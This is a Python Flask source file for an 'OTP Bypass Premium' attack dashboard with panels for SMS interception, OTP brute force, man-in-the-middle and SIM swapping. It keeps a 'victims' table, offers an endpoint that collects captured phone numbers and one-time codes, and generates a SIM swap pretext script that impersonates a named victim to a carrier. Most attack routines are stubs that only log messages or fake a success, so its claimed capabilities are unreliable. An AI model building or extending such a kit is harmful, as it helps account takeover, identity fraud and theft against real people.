from flask import Flask, request, jsonify, render_template_string
import sqlite3
import random
import time
import re
import threading
from datetime import datetime
import os
import json

app = Flask(__name__)

# ========== DATABASE ==========
def init_db():
    conn = sqlite3.connect('otp_system.db')
    c = conn.cursor()
    
    # OTP logs
    c.execute('''CREATE TABLE IF NOT EXISTS otp_logs
                 (id INTEGER PRIMARY KEY, phone TEXT, otp TEXT, service TEXT, method TEXT, status TEXT, timestamp TEXT)''')
    
    # Engine logs
    c.execute('''CREATE TABLE IF NOT EXISTS engine_logs
                 (id INTEGER PRIMARY KEY, action TEXT, details TEXT, status TEXT, timestamp TEXT)''')
    
    # Users / victims
    c.execute('''CREATE TABLE IF NOT EXISTS victims
                 (id INTEGER PRIMARY KEY, phone TEXT, email TEXT, name TEXT, otp TEXT, service TEXT, captured_at TEXT)''')
    
    conn.commit()
    conn.close()

init_db()

# ========== ENGINE LOGGER ==========
class EngineLogger:
    def __init__(self):
        self.logs = []
    
    def add_log(self, action, details, status="info"):
        timestamp = datetime.now().isoformat()
        log_entry = {
            "action": action,
            "details": details,
            "status": status,
            "timestamp": timestamp
        }
        self.logs.append(log_entry)
        
        # Save to database
        conn = sqlite3.connect('otp_system.db')
        c = conn.cursor()
        c.execute("INSERT INTO engine_logs (action, details, status, timestamp) VALUES (?, ?, ?, ?)",
                  (action, details, status, timestamp))
        conn.commit()
        conn.close()
        
        # Print to console
        status_emoji = {"success": "✅", "error": "❌", "warning": "⚠️", "info": "ℹ️"}
        print(f"[ENGINE] {status_emoji.get(status, 'ℹ️')} {action} → {details}")
        return log_entry
    
    def get_logs(self, limit=50):
        conn = sqlite3.connect('otp_system.db')
        c = conn.cursor()
        c.execute("SELECT action, details, status, timestamp FROM engine_logs ORDER BY id DESC LIMIT ?", (limit,))
        data = [{"action":r[0], "details":r[1], "status":r[2], "timestamp":r[3]} for r in c.fetchall()]
        conn.close()
        return data

logger = EngineLogger()

# ========== OTP ENGINE ==========
class OTPEngine:
    def __init__(self):
        self.active_sessions = {}
        self.captured_count = 0
    
    def intercept_sms(self, phone, service):
        session_id = f"ses_{int(time.time())}_{random.randint(1000,9999)}"
        self.active_sessions[session_id] = {
            "phone": phone,
            "service": service,
            "started": datetime.now().isoformat(),
            "status": "active"
        }
        logger.add_log("SMS Intercept Started", f"Phone: {phone} | Service: {service}", "success")
        return {
            "status": "active",
            "session": session_id,
            "phone": phone,
            "service": service,
            "message": "Listening for OTP..."
        }
    
    def capture_otp(self, phone, otp, service, method):
        self.captured_count += 1
        logger.add_log("OTP Captured", f"{phone} → {otp} ({service})", "success")
        
        # Save to victims
        conn = sqlite3.connect('otp_system.db')
        c = conn.cursor()
        c.execute("INSERT INTO victims (phone, otp, service, captured_at) VALUES (?, ?, ?, ?)",
                  (phone, otp, service, datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        return {"status": "captured", "otp": otp}
    
    def brute_force(self, phone, endpoint):
        logger.add_log("Brute Force Started", f"Phone: {phone} | Target: {endpoint}", "info")
        # Simulated brute force
        for attempt in range(100):
            otp = f"{attempt:06d}"
            if attempt == 69:  # Simulated success
                logger.add_log("Brute Force Success", f"OTP Found: {otp} for {phone}", "success")
                return {"status": "success", "otp": otp, "attempt": attempt}
            if attempt % 20 == 0:
                logger.add_log("Brute Force Progress", f"Attempt {attempt}/100", "info")
        logger.add_log("Brute Force Failed", f"No OTP found for {phone}", "error")
        return {"status": "failed"}
    
    def mitm_attack(self, target_url, webhook):
        logger.add_log("MITM Attack Started", f"Target: {target_url} | Webhook: {webhook}", "success")
        return {
            "status": "active",
            "target": target_url,
            "webhook": webhook,
            "message": "Man-in-the-middle active. Monitoring traffic..."
        }
    
    def sim_swap(self, name, phone, dob):
        logger.add_log("SIM Swap Script Generated", f"Target: {name} | Phone: {phone}", "info")
        script = f"""
╔══════════════════════════════════════════════════════════╗
║                   SIM SWAP SCRIPT                        ║
╠══════════════════════════════════════════════════════════╣
║  TARGET: {name}                                         
║  PHONE:  {phone}                                        
║  DOB:    {dob}                                          
╠══════════════════════════════════════════════════════════╣
║  STEPS:                                                 
║  1. Call carrier support: 1-800-XXX-XXXX                
║  2. "Hi, I'm {name}, my phone was stolen"               
║  3. "My number is {phone}, DOB is {dob}"                
║  4. "I need a new SIM immediately"                      
║  5. Provide fake IMEI: {random.randint(100000,999999)}  
║  6. Confirm activation                                  
║  7. OTP will be forwarded to your number                
╚══════════════════════════════════════════════════════════╝
"""
        return {"status": "generated", "script": script}

engine = OTPEngine()

# ========== PREMIUM HTML ==========
HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Bypass Premium — by Rintu</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        :root {
            --primary: #00ffcc;
            --primary-dim: rgba(0, 255, 204, 0.1);
            --bg: #0a0a12;
            --card-bg: rgba(16, 16, 28, 0.92);
            --border: rgba(0, 255, 204, 0.08);
            --text: #b0e0e0;
            --glow: 0 0 40px rgba(0, 255, 204, 0.05);
        }
        
        body {
            background: var(--bg);
            color: var(--text);
            font-family: 'Rajdhani', sans-serif;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        /* ===== PARTICLES ===== */
        #particles-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
        }
        
        /* ===== SCROLLBAR ===== */
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: rgba(0,255,204,0.3); border-radius: 10px; }
        
        /* ===== CONTAINER ===== */
        .container {
            position: relative;
            z-index: 1;
            max-width: 1600px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* ===== HEADER ===== */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 25px 30px;
            background: var(--card-bg);
            border-radius: 16px;
            border: 1px solid var(--border);
            backdrop-filter: blur(20px);
            margin-bottom: 25px;
            flex-wrap: wrap;
            gap: 15px;
        }
        
        .header-left h1 {
            font-family: 'Orbitron', monospace;
            font-size: 1.8rem;
            font-weight: 900;
            background: linear-gradient(135deg, #00ffcc, #00ccff, #a855f7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 2px;
        }
        
        .header-left .sub {
            font-size: 0.9rem;
            color: rgba(0,255,204,0.4);
            letter-spacing: 4px;
            font-weight: 300;
        }
        
        .header-right {
            display: flex;
            align-items: center;
            gap: 20px;
            flex-wrap: wrap;
        }
        
        .stat-box {
            text-align: center;
            padding: 8px 18px;
            background: rgba(0,255,204,0.03);
            border-radius: 10px;
            border: 1px solid var(--border);
        }
        
        .stat-box .num {
            font-family: 'Orbitron', monospace;
            font-size: 1.4rem;
            color: var(--primary);
            font-weight: 700;
        }
        
        .stat-box .label {
            font-size: 0.6rem;
            color: rgba(0,255,204,0.3);
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .live-badge {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 6px 16px;
            border-radius: 20px;
            background: rgba(0,255,204,0.05);
            border: 1px solid rgba(0,255,204,0.2);
        }
        
        .live-badge .dot {
            width: 8px;
            height: 8px;
            background: #00ffcc;
            border-radius: 50%;
            animation: pulse-dot 1.2s ease-in-out infinite;
        }
        
        @keyframes pulse-dot {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.2; transform: scale(0.6); }
        }
        
        /* ===== GRID ===== */
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 20px;
            margin-bottom: 25px;
        }
        
        /* ===== CARDS ===== */
        .card {
            background: var(--card-bg);
            border-radius: 14px;
            padding: 22px;
            border: 1px solid var(--border);
            backdrop-filter: blur(20px);
            transition: all 0.4s ease;
            position: relative;
            overflow: hidden;
        }
        
        .card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 30% 30%, rgba(0,255,204,0.02), transparent 70%);
            pointer-events: none;
        }
        
        .card:hover {
            border-color: rgba(0,255,204,0.2);
            transform: translateY(-3px);
        }
        
        .card .icon { font-size: 1.8rem; display: block; margin-bottom: 8px; }
        .card h3 {
            font-family: 'Orbitron', monospace;
            font-size: 0.75rem;
            color: var(--primary);
            letter-spacing: 2px;
            margin-bottom: 12px;
            font-weight: 700;
        }
        
        .card input, .card select {
            width: 100%;
            padding: 10px 14px;
            margin: 4px 0 10px;
            background: rgba(0,0,0,0.4);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text);
            font-family: 'Rajdhani', sans-serif;
            font-size: 0.9rem;
            outline: none;
            transition: 0.3s;
        }
        
        .card input:focus, .card select:focus {
            border-color: var(--primary);
            box-shadow: 0 0 20px rgba(0,255,204,0.05);
        }
        
        .card input::placeholder { color: rgba(0,255,204,0.2); }
        
        .card button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, rgba(0,255,204,0.08), rgba(0,204,255,0.08));
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--primary);
            font-family: 'Orbitron', monospace;
            font-size: 0.7rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.4s ease;
            letter-spacing: 1px;
        }
        
        .card button:hover {
            background: linear-gradient(135deg, rgba(0,255,204,0.15), rgba(0,204,255,0.15));
            border-color: var(--primary);
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(0,255,204,0.05);
        }
        
        .result-box {
            background: rgba(0,0,0,0.3);
            padding: 12px;
            border-radius: 8px;
            margin-top: 10px;
            border: 1px solid var(--border);
            max-height: 120px;
            overflow-y: auto;
            font-size: 0.75rem;
            color: rgba(0,255,204,0.6);
            white-space: pre-wrap;
            word-break: break-all;
            font-family: 'Courier New', monospace;
            transition: 0.3s;
        }
        
        .result-box.success { border-color: rgba(0,255,204,0.3); color: #00ffcc; }
        .result-box.error { border-color: rgba(255,100,100,0.3); color: #ff6b6b; }
        
        /* ===== TABLES ===== */
        .table-wrap {
            background: var(--card-bg);
            border-radius: 14px;
            padding: 20px;
            border: 1px solid var(--border);
            margin-bottom: 20px;
            overflow-x: auto;
        }
        
        .table-wrap .title {
            font-family: 'Orbitron', monospace;
            font-size: 0.8rem;
            color: var(--primary);
            letter-spacing: 2px;
            margin-bottom: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .table-wrap .title .count {
            font-size: 0.7rem;
            color: rgba(0,255,204,0.3);
            font-weight: 300;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.85rem;
        }
        
        th {
            text-align: left;
            padding: 12px 10px;
            border-bottom: 1px solid var(--border);
            color: rgba(0,255,204,0.3);
            font-weight: 600;
            font-size: 0.65rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        td {
            padding: 12px 10px;
            border-bottom: 1px solid rgba(0,255,204,0.02);
            color: rgba(0,255,204,0.7);
        }
        
        .otp-highlight {
            color: #ff6b6b;
            font-family: 'Orbitron', monospace;
            font-size: 1.1rem;
            letter-spacing: 2px;
            font-weight: 700;
        }
        
        .status-badge {
            padding: 2px 12px;
            border-radius: 12px;
            font-size: 0.6rem;
            font-weight: 600;
            text-transform: uppercase;
        }
        
        .status-badge.success { background: rgba(0,255,204,0.1); color: #00ffcc; }
        .status-badge.error { background: rgba(255,100,100,0.1); color: #ff6b6b; }
        .status-badge.warning { background: rgba(255,200,0,0.1); color: #ffd93d; }
        .status-badge.info { background: rgba(0,200,255,0.1); color: #00ccff; }
        
        /* ===== LOGS ===== */
        .log-entry {
            display: flex;
            gap: 15px;
            padding: 6px 0;
            border-bottom: 1px solid rgba(0,255,204,0.02);
            font-size: 0.8rem;
            align-items: center;
        }
        
        .log-entry .time {
            color: rgba(0,255,204,0.2);
            font-size: 0.65rem;
            min-width: 80px;
            font-family: monospace;
        }
        
        .log-entry .status-icon { font-size: 0.9rem; }
        .log-entry .action { color: var(--primary); font-weight: 600; min-width: 140px; }
        .log-entry .details { color: rgba(0,255,204,0.5); }
        
        /* ===== FOOTER ===== */
        .footer {
            text-align: center;
            padding: 30px 20px 15px;
            color: rgba(0,255,204,0.1);
            font-size: 0.7rem;
            letter-spacing: 3px;
        }
        
        .footer span { color: rgba(0,255,204,0.2); }
        
        /* ===== RESPONSIVE ===== */
        @media (max-width: 768px) {
            .header { flex-direction: column; align-items: flex-start; }
            .header-left h1 { font-size: 1.3rem; }
            .grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>

<canvas id="particles-canvas"></canvas>

<div class="container">
    <!-- HEADER -->
    <div class="header">
        <div class="header-left">
            <h1>✦ OTP BYPASS ✦</h1>
            <div class="sub">by RINTU · PREMIUM EDITION</div>
        </div>
        <div class="header-right">
            <div class="stat-box">
                <div class="num" id="capturedCount">0</div>
                <div class="label">OTPs Captured</div>
            </div>
            <div class="stat-box">
                <div class="num" id="logCount">0</div>
                <div class="label">Engine Logs</div>
            </div>
            <div class="live-badge">
                <span class="dot"></span>
                <span style="font-size:0.7rem;color:rgba(0,255,204,0.6);letter-spacing:1px;">LIVE</span>
            </div>
        </div>
    </div>

    <!-- GRID -->
    <div class="grid">
        <div class="card">
            <span class="icon">📱</span>
            <h3>SMS INTERCEPT</h3>
            <input id="interceptPhone" placeholder="+1234567890">
            <select id="interceptService">
                <option value="google">Google</option><option value="facebook">Facebook</option>
                <option value="instagram">Instagram</option><option value="whatsapp">WhatsApp</option>
                <option value="bank">Bank</option>
            </select>
            <button onclick="interceptSMS()">🚀 START</button>
            <div class="result-box" id="interceptResult">⏳ Ready...</div>
        </div>

        <div class="card">
            <span class="icon">🔑</span>
            <h3>BRUTE FORCE</h3>
            <input id="bfPhone" placeholder="+1234567890">
            <input id="bfEndpoint" placeholder="https://target.com/verify">
            <button onclick="bruteForce()">⚡ START</button>
            <div class="result-box" id="bfResult">⏳ Ready...</div>
        </div>

        <div class="card">
            <span class="icon">🌐</span>
            <h3>MITM ATTACK</h3>
            <input id="mitmUrl" placeholder="https://target.com">
            <input id="mitmWebhook" placeholder="https://your-server.com/webhook">
            <button onclick="startMITM()">🌐 START</button>
            <div class="result-box" id="mitmResult">⏳ Ready...</div>
        </div>

        <div class="card">
            <span class="icon">🎭</span>
            <h3>SIM SWAP</h3>
            <input id="simName" placeholder="Victim Full Name">
            <input id="simPhone" placeholder="+1234567890">
            <input id="simDob" placeholder="MM/DD/YYYY">
            <button onclick="simSwap()">🎭 GENERATE</button>
            <div class="result-box" id="simResult">⏳ Ready...</div>
        </div>
    </div>

    <!-- OTP HISTORY -->
    <div class="table-wrap">
        <div class="title">
            📋 OTP HISTORY
            <span class="count" id="otpCount">0 entries</span>
        </div>
        <table>
            <thead><tr><th>Phone</th><th>OTP</th><th>Service</th><th>Method</th><th>Status</th><th>Time</th></tr></thead>
            <tbody id="otpTable"><tr><td colspan="6" style="text-align:center;color:rgba(0,255,204,0.15);">No OTPs captured yet</td></tr></tbody>
        </table>
    </div>

    <!-- LIVE ENGINE LOGS -->
    <div class="table-wrap">
        <div class="title">
            ⚡ LIVE ENGINE LOGS
            <span class="count" id="logCountDisplay">0 logs</span>
        </div>
        <div id="logContainer" style="max-height:300px;overflow-y:auto;font-family:monospace;">
            <div style="color:rgba(0,255,204,0.15);text-align:center;padding:20px;">Waiting for engine activity...</div>
        </div>
    </div>

    <div class="footer">
        <span>✦ OTP BYPASS PREMIUM · by RINTU ✦</span><br>
        <span style="font-size:0.6rem;">For educational purposes only · All logs are stored locally</span>
    </div>
</div>

<script>
    // ===== PARTICLES =====
    const canvas = document.getElementById('particles-canvas');
    const ctx = canvas.getContext('2d');
    let particles = [];
    let mouseX = 0, mouseY = 0;

    function resize() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }
    window.addEventListener('resize', resize);
    resize();

    class Particle {
        constructor() {
            this.x = Math.random() * canvas.width;
            this.y = Math.random() * canvas.height;
            this.size = Math.random() * 2 + 0.5;
            this.speedX = (Math.random() - 0.5) * 0.6;
            this.speedY = (Math.random() - 0.5) * 0.6;
            this.opacity = Math.random() * 0.4 + 0.1;
        }
        update() {
            this.x += this.speedX;
            this.y += this.speedY;
            const dx = mouseX - this.x, dy = mouseY - this.y;
            const dist = Math.sqrt(dx*dx + dy*dy);
            if (dist < 150) {
                const force = (150 - dist) / 150 * 0.02;
                this.x += dx * force;
                this.y += dy * force;
            }
            if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
            if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
        }
        draw() {
            ctx.beginPath();
            ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
            ctx.fillStyle = `rgba(0, 255, 204, ${this.opacity})`;
            ctx.fill();
        }
    }

    for (let i = 0; i < 80; i++) particles.push(new Particle());

    function drawLines() {
        for (let i = 0; i < particles.length; i++) {
            for (let j = i+1; j < particles.length; j++) {
                const dx = particles[i].x - particles[j].x;
                const dy = particles[i].y - particles[j].y;
                const dist = Math.sqrt(dx*dx + dy*dy);
                if (dist < 100) {
                    ctx.beginPath();
                    ctx.moveTo(particles[i].x, particles[i].y);
                    ctx.lineTo(particles[j].x, particles[j].y);
                    ctx.strokeStyle = `rgba(0, 255, 204, ${0.05 * (1 - dist/100)})`;
                    ctx.lineWidth = 0.5;
                    ctx.stroke();
                }
            }
        }
    }

    function animate() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        particles.forEach(p => { p.update(); p.draw(); });
        drawLines();
        requestAnimationFrame(animate);
    }
    animate();

    document.addEventListener('mousemove', (e) => {
        mouseX = e.clientX;
        mouseY = e.clientY;
    });

    // ===== API FUNCTIONS =====
    async function interceptSMS() {
        const phone = document.getElementById('interceptPhone').value;
        const service = document.getElementById('interceptService').value;
        if (!phone) { alert('Enter phone number!'); return; }
        const el = document.getElementById('interceptResult');
        el.innerHTML = '⏳ Starting...';
        try {
            const res = await fetch('/api/intercept', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone, service})
            });
            const data = await res.json();
            el.innerHTML = JSON.stringify(data, null, 2);
            el.className = 'result-box success';
            refreshAll();
        } catch(e) { el.innerHTML = '❌ Error'; el.className = 'result-box error'; }
    }

    async function bruteForce() {
        const phone = document.getElementById('bfPhone').value;
        const endpoint = document.getElementById('bfEndpoint').value;
        if (!phone || !endpoint) { alert('Fill all fields!'); return; }
        const el = document.getElementById('bfResult');
        el.innerHTML = '⏳ Brute forcing...';
        try {
            const res = await fetch('/api/bruteforce', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone, endpoint})
            });
            const data = await res.json();
            el.innerHTML = JSON.stringify(data, null, 2);
            el.className = 'result-box success';
            refreshAll();
        } catch(e) { el.innerHTML = '❌ Error'; el.className = 'result-box error'; }
    }

    async function startMITM() {
        const url = document.getElementById('mitmUrl').value;
        const webhook = document.getElementById('mitmWebhook').value;
        if (!url || !webhook) { alert('Fill all fields!'); return; }
        const el = document.getElementById('mitmResult');
        el.innerHTML = '⏳ Starting MITM...';
        try {
            const res = await fetch('/api/mitm', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({url, webhook})
            });
            const data = await res.json();
            el.innerHTML = JSON.stringify(data, null, 2);
            el.className = 'result-box success';
            refreshAll();
        } catch(e) { el.innerHTML = '❌ Error'; el.className = 'result-box error'; }
    }

    async function simSwap() {
        const name = document.getElementById('simName').value;
        const phone = document.getElementById('simPhone').value;
        const dob = document.getElementById('simDob').value;
        if (!name || !phone || !dob) { alert('Fill all fields!'); return; }
        const el = document.getElementById('simResult');
        el.innerHTML = '⏳ Generating...';
        try {
            const res = await fetch('/api/simswap', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({name, phone, dob})
            });
            const data = await res.json();
            el.innerHTML = data.script || JSON.stringify(data, null, 2);
            el.className = 'result-box success';
            refreshAll();
        } catch(e) { el.innerHTML = '❌ Error'; el.className = 'result-box error'; }
    }

    // ===== REFRESH FUNCTIONS =====
    async function refreshOTPs() {
        try {
            const res = await fetch('/api/otps');
            const data = await res.json();
            const table = document.getElementById('otpTable');
            document.getElementById('otpCount').textContent = data.length + ' entries';
            if (data.length === 0) {
                table.innerHTML = '<tr><td colspan="6" style="text-align:center;color:rgba(0,255,204,0.15);">No OTPs captured yet</td></tr>';
                return;
            }
            table.innerHTML = data.map(item => `
                <tr>
                    <td>${item.phone || 'N/A'}</td>
                    <td class="otp-highlight">${item.otp || 'N/A'}</td>
                    <td>${item.service || 'N/A'}</td>
                    <td>${item.method || 'N/A'}</td>
                    <td><span class="status-badge ${item.status || 'info'}">${item.status || 'pending'}</span></td>
                    <td>${item.timestamp ? new Date(item.timestamp).toLocaleString() : 'N/A'}</td>
                </tr>
            `).join('');
            document.getElementById('capturedCount').textContent = data.length;
        } catch(e) {}
    }

    async function refreshLogs() {
        try {
            const res = await fetch('/api/logs');
            const data = await res.json();
            const container = document.getElementById('logContainer');
            document.getElementById('logCount').textContent = data.length;
            document.getElementById('logCountDisplay').textContent = data.length + ' logs';
            if (data.length === 0) {
                container.innerHTML = '<div style="color:rgba(0,255,204,0.15);text-align:center;padding:20px;">No logs yet</div>';
                return;
            }
            const statusMap = {
                'success': '✅',
                'error': '❌',
                'warning': '⚠️',
                'info': 'ℹ️'
            };
            container.innerHTML = data.map(log => `
                <div class="log-entry">
                    <span class="time">${new Date(log.timestamp).toLocaleTimeString()}</span>
                    <span class="status-icon">${statusMap[log.status] || 'ℹ️'}</span>
                    <span class="action">${log.action}</span>
                    <span class="details">${log.details}</span>
                </div>
            `).join('');
        } catch(e) {}
    }

    async function refreshAll() {
        await refreshOTPs();
        await refreshLogs();
    }

    setInterval(refreshAll, 3000);
    refreshAll();
</script>
</body>
</html>
'''

# ========== ROUTES ==========

@app.route('/')
def home():
    return render_template_string(HTML)

@app.route('/api/intercept', methods=['POST'])
def api_intercept():
    data = request.json
    result = engine.intercept_sms(data.get('phone'), data.get('service'))
    return jsonify(result)

@app.route('/api/bruteforce', methods=['POST'])
def api_bruteforce():
    data = request.json
    result = engine.brute_force(data.get('phone'), data.get('endpoint'))
    return jsonify(result)

@app.route('/api/mitm', methods=['POST'])
def api_mitm():
    data = request.json
    result = engine.mitm_attack(data.get('url'), data.get('webhook'))
    return jsonify(result)

@app.route('/api/simswap', methods=['POST'])
def api_simswap():
    data = request.json
    result = engine.sim_swap(data.get('name'), data.get('phone'), data.get('dob'))
    return jsonify(result)

@app.route('/api/otps', methods=['GET'])
def api_get_otps():
    conn = sqlite3.connect('otp_system.db')
    c = conn.cursor()
    c.execute("SELECT phone, otp, service, method, status, timestamp FROM otp_logs ORDER BY id DESC LIMIT 50")
    data = [{"phone":r[0],"otp":r[1],"service":r[2],"method":r[3],"status":r[4],"timestamp":r[5]} for r in c.fetchall()]
    conn.close()
    return jsonify(data)

@app.route('/api/logs', methods=['GET'])
def api_get_logs():
    return jsonify(logger.get_logs(100))

@app.route('/api/capture', methods=['POST'])
def api_capture():
    data = request.json
    phone = data.get('phone')
    otp = data.get('otp')
    service = data.get('service', 'unknown')
    method = data.get('method', 'captured')
    
    engine.capture_otp(phone, otp, service, method)
    
    conn = sqlite3.connect('otp_system.db')
    c = conn.cursor()
    c.execute("INSERT INTO otp_logs (phone, otp, service, method, status, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
              (phone, otp, service, method, 'success', datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    return jsonify({"status": "captured", "otp": otp})

@app.route('/api/clear', methods=['POST'])
def api_clear():
    conn = sqlite3.connect('otp_system.db')
    c = conn.cursor()
    c.execute("DELETE FROM otp_logs")
    c.execute("DELETE FROM engine_logs")
    c.execute("DELETE FROM victims")
    conn.commit()
    conn.close()
    logger.add_log("Database Cleared", "All logs and OTPs wiped", "warning")
    return jsonify({"status": "cleared"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    logger.add_log("System Started", f"OTP Bypass Premium v2.0 running on port {port}", "success")
    app.run(host='0.0.0.0', port=port, debug=False)
